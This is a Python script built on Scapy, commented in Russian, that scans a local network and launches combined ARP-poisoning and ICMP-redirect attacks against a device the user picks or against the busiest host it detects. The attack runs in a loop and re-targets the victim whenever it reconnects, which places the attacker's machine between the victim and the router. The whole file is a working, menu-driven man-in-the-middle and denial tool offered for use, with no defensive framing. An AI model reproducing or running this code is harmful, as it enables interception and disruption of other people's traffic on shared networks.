import scapy.all as scapy
import os
import socket
import sys
import time
import ctypes
from threading import Thread
from collections import Counter
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp, sniff, send
from scapy.arch import get_if_addr
from scapy.all import conf
from scapy.layers.inet import ICMP, IP


class NetworkTool:
    def __init__(self):
        self.my_ip = get_if_addr(conf.iface)
        self.router_ip = self._get_gateway_ip()
        self.router_mac = self._get_mac(self.router_ip)
        self.network_range = ".".join(self.my_ip.split(".")[:-1]) + ".0/24"
        self.is_attacking = False
        self.target_info = {"ip": None, "mac": None, "name": None, "packets": 0}
        self.found_devices = []

    def _get_gateway_ip(self):
        if os.name == 'nt':
            import subprocess
            result = subprocess.run(['route', 'print', '0.0.0.0'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '0.0.0.0' in line and 'mask' not in line.lower():
                    parts = line.split()
                    if len(parts) >= 3 and parts[2] != "On-link": return parts[2]
        return "192.168.0.1"

    def _get_mac(self, ip):
        if not ip: return None
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=2, verbose=0)[0]
        return ans[0][1].hwsrc if ans else None

    def update_devices(self):
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range), timeout=3, retry=2, verbose=0)[0]
        devs = []
        for _, r in ans:
            if r.psrc != self.my_ip and r.psrc != self.router_ip:
                try:
                    name = socket.gethostbyaddr(r.psrc)[0]
                except:
                    name = "Unknown Device"
                devs.append({'ip': r.psrc, 'mac': r.hwsrc, 'name': name})
        self.found_devices = devs

    def find_noisy_guy(self, duration=7):
        counts = Counter()

        def count_packets(pkt):
            if pkt.haslayer(IP):
                src = pkt[IP].src
                if src not in [self.my_ip, self.router_ip]: counts[src] += 1

        sniff(prn=count_packets, timeout=duration)
        return counts.most_common(1)[0][0] if counts else None

    def attack_process(self):
        """Комбинированная атака: ARP Poisoning + ICMP Redirect"""
        t_ip = self.target_info['ip']
        t_mac = self.target_info['mac']

        # 1. ARP пакеты (L2)
        # Шлем цели: "Я роутер"
        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.router_ip)
        # Шлем роутеру: "Я цель"
        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac, psrc=t_ip)
        # Broadcast для удержания
        broadcast_p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=t_ip, psrc=self.router_ip)

        # 2. ICMP Redirect пакет (L3)
        # Говорим цели: "Для трафика во внешку (8.8.8.8) используй мой IP как шлюз"
        icmp_p = IP(src=self.router_ip, dst=t_ip) / ICMP(type=5, code=1, gw=self.my_ip) / IP(src=t_ip, dst='8.8.8.8')

        print(f"[*] Атака запущена: ARP + ICMP Redirect на {t_ip}")

        while self.is_attacking:
            try:
                # Атакуем по ARP
                sendp(to_v, verbose=False)
                sendp(to_r, verbose=False)

                # Каждые 10 циклов усиливаем эффект
                if self.target_info['packets'] % 20 == 0:
                    sendp(broadcast_p, verbose=False)  # L2 удержание
                    send(icmp_p, verbose=False)  # L3 перенаправление

                self.target_info['packets'] += 2

                # Проверка на вылет из сети (Засада)
                if self.target_info['packets'] % 100 == 0:
                    check = srp(Ether(dst=t_mac) / ARP(pdst=t_ip), timeout=0.2, verbose=0)[0]
                    if not check:
                        print(f"\n[!] Цель {t_ip} пропала. Ухожу в ЗАСАДУ...")
                        self._wait_for_target()

                time.sleep(0.05)
            except Exception as e:
                continue

    def _wait_for_target(self):
        while self.is_attacking:
            ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_info['ip']), timeout=1, verbose=0)[0]
            if ans:
                self.target_info['mac'] = ans[0][1].hwsrc
                print(f"[+] Цель вернулась! Новый MAC: {self.target_info['mac']}")
                return
            time.sleep(1)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    tool = NetworkTool()
    tool.update_devices()

    while True:
        clear_screen()
        print(f"--- [ NETWORK MONITOR v2.5 - HYBRID ] ---")
        print(f"MY IP: {tool.my_ip} | GW: {tool.router_ip} ({tool.router_mac})")
        print("-" * 55)
        if tool.is_attacking:
            print(f"● СТАТУС: АТАКА АКТИВНА | ЦЕЛЬ: {tool.target_info['ip']}")
            print(f"ОТПРАВЛЕНО ПАКЕТОВ: {tool.target_info['packets']}")
        else:
            print(f"○ СТАТУС: ОЖИДАНИЕ")
        print("-" * 55)
        print("ID | IP АДРЕС       | MAC АДРЕС         | ИМЯ")
        for i, d in enumerate(tool.found_devices):
            print(f"{i:2} | {d['ip'].ljust(14)} | {d['mac']} | {d['name']}")
        print("-" * 55)
        print("1. Сканировать | 2. Атака ID | 3. По шуму | 4. СТОП | 5. Выход")

        cmd = input(">> ")
        if cmd == '1':
            tool.update_devices()
        elif cmd == '2':
            try:
                idx = int(input("Введите ID: "))
                target = tool.found_devices[idx]
                tool.is_attacking = False  # Сброс старой атаки
                time.sleep(0.2)
                tool.target_info.update(
                    {"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
                tool.is_attacking = True
                Thread(target=tool.attack_process, daemon=True).start()
            except:
                pass
        elif cmd == '3':
            noisy_ip = tool.find_noisy_guy()
            if noisy_ip:
                mac = tool._get_mac(noisy_ip)
                if mac:
                    tool.is_attacking = False
                    time.sleep(0.2)
                    tool.target_info.update({"ip": noisy_ip, "mac": mac, "name": "Noisy Guy", "packets": 0})
                    tool.is_attacking = True
                    Thread(target=tool.attack_process, daemon=True).start()
        elif cmd == '4':
            tool.is_attacking = False
        elif cmd == '5':
            tool.is_attacking = False
            break


if __name__ == "__main__":
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        sys.exit()
    main()